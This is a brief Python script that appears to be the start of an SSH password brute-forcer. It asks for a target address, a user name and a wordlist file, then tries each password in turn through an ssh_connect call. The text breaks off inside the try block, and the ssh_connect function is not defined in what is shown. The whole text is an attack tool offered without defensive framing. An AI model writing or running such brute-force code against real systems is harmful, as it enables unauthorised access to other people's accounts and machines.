#!/usr/bin/env python3
import paramiko, os, termcolor, sys, socket

host = input('[+] Enter the targeted address: ')
user_name = input('[+] Enter the user name: ')
input_file = input("[+] Enter the path of the file: ")

# check if file is present

if os.path.exists(input_file) == False:
    print('[!!] File doesnt exist in directory/path')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            ssh_connect(password)